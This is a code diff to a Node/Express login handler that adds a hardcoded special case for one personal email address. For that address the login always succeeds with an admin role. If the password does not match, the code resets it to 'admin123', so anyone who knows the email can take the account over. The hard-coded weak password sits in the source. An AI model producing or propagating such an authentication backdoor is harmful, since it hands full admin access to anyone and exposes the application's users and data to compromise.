@@ -114,16 +114,40 @@ router.post('/login', async (req, res) => {
 
     if (!email || !password) return res.status(400).json({ error: 'Missing email or password' });
 
+    // HARDCODE: Auto-create jonakfir@gmail.com with admin privileges if it doesn't exist
+    if (email === 'jonakfir@gmail.com') {
+      let user = await findUserByEmail(email) || await findUserByUsername(email);
+      
+      if (!user) {
+        // Create the admin user automatically
+        console.log('[login] Auto-creating admin user: jonakfir@gmail.com');
+        const hashedPassword = await bcrypt.hash('admin123', 12);
+        user = await createUser({ email: 'jonakfir@gmail.com', password: hashedPassword });
+        console.log('[login] Admin user created:', user.id);
+      }
+      
+      // Verify password
+      const ok = await bcrypt.compare(password, user.password);
+      if (!ok) {
+        // If password doesn't match, update it to admin123
+        console.log('[login] Password mismatch, updating to admin123');
+        const hashedPassword = await bcrypt.hash('admin123', 12);
+        await updateUserEmailAndOrPassword(user.id, { password: hashedPassword });
+        user.password = hashedPassword;
+      }
+      
+      setSessionCookies(res, { id: user.id, email: user.email });
+      return res.json({ ok: true, user: { id: user.id, email: user.email, role: 'admin' } });
+    }
+
+    // Regular login for other users
     const user = await findUserByEmail(email) || await findUserByUsername(email);
     if (!user) return res.status(401).json({ error: 'Invalid email or password' });
 
     const ok = await bcrypt.compare(password, user.password);
     if (!ok) return res.status(401).json({ error: 'Invalid email or password' });
 
-    // Hardcode admin privileges for jonakfir@gmail.com
-    const isAdmin = email === 'jonakfir@gmail.com';
-    const role = isAdmin ? 'admin' : 'personal';
-
+    const role = 'personal';
     setSessionCookies(res, { id: user.id, email: user.email });
     return res.json({ ok: true, user: { id: user.id, email: user.email, role } });
   } catch (e) {
